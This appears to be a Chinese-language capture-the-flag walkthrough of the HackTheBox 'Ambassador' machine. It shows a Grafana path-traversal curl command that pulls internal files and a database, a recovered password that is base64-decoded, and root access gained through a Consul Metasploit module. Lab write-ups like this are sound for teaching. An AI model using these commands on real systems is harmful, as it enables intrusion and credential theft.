![在这里插入图片描述](https://img-blog.csdnimg.cn/0bd65abd219e43e6bb3c4fa7e0a982f5.png)
题目网址：
```
https://app.hackthebox.com/machines/Ambassador
```
# 枚举
使用nmap枚举靶机
```
nmap -sC -sV -p- 10.10.11.183
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/4b9873d85da14f7588edebf97ed91317.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/0ce8f3ed6d5349ad87f13417235335c4.png)

这次扫描到了四个端口
```
22
80
3000
3306
```
这些端口都应该是有用的，先对80端口进行枚举，网址根目录扫描，网站模板枚举

![在这里插入图片描述](https://img-blog.csdnimg.cn/0f34572d03eb4085bb9a76a1007510c7.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/d720e4fe698a4a3c9569edc45e9783ff.png)

通过这个网站的唯一一篇文章可以知道，有一个developer账户可以去访问ssh



但是进行一系列枚举后，并没有从80端口找到什么突破点，根据nmap的扫描结果来看，3000端口上运行的也是一个网站，我们去3000端口看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/d4a0f2f9a59041688dd800b3a9817ab8.png)

这个网站框架是Grafana，我用searchsploit搜索了一下存在的漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/e9231706d9c54a108418101fd025e39d.png)

发现可能存在目录遍历和任意文件读取漏洞，我们用这个脚本试试

```
locate multiple/webapps/50581.py
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6d3d51ea4c9a4fadaec9ad15588eb326.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/63178283d3b445fab1085cdfb309f0cb.png)

成功读取到了/etc/passwd的文件内容

现在我们读取Grafana的配置文件，看能不能得到后台密码

```
https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/d03817938b844eb3b5123284e61a746e.png)


通过查询官方文档，发现Grafana的配置文件地址为
```
/etc/grafana/grafana.ini
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/fa662fdb9e5444d09f8d13f3d1540677.png)

通过配置文件可以发现用户和密码，返回网站登录
# 获取用户shell
登录后，我在后台到处看了一下，没找到什么有用的东西，现在我们把Grafana的库下载到本地看看

```
curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/9f551c98716d49cfb33604b5b02b5dd8.png)

在data_source表里发现了登录mysql的用户名和密码，现在我们登录mysql
```
mysql -h 10.10.11.183 -u grafana -p
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a403d7dab6b3405981384e073c7f5cbc.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/d0e9bb8a95e743a2b1770e50677131d9.png)

在whackywidget数据库里找到了developer用户的密码，根据80端口的网站提示，这个用户可以登录ssh，base64解密后登录ssh
```
echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
ssh developer@10.10.11.183
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ff8a7303c20947b09bd13272625fa8ee.png)

成功获得用户shell
# 提权

通过查看当前文件夹的文件，发现了一个有趣的文件
```
ls -al
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b2192e6632154bb9b4395bd95aa9f86f.png)


这是Git的配置文件，通过查看这个文件里的内容，可以找到一个位置

![在这里插入图片描述](https://img-blog.csdnimg.cn/4bca7d9911e14c959995c2a7cfcda0aa.png)
```
/opt/my-app
```
然后查看以前的提交
```
git show
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8b8eb452df9b40f98677b728af854775.png)

# git consul API提权
我们找到了一个git的令牌，通过google搜索相关的利用，我们可以利用这个api来提权
```
https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/misc/consul_service_exec
```

可以用msfconsole，也可以手动
首先我们把靶机的8500端口转发到本地
```
ssh -L 8500:0.0.0.0:8500  developer@10.10.11.183
```

然后运行msfconsole使用exploit/multi/misc/consul_service_exec模块

![在这里插入图片描述](https://img-blog.csdnimg.cn/7bda3c8898f949cfa598389c9377f65a.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/823abc5fc620449cb6f3d6ba44870c3e.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/eda1694d7d2b44ae8ce000082eccfe86.png)

成功获得root权限
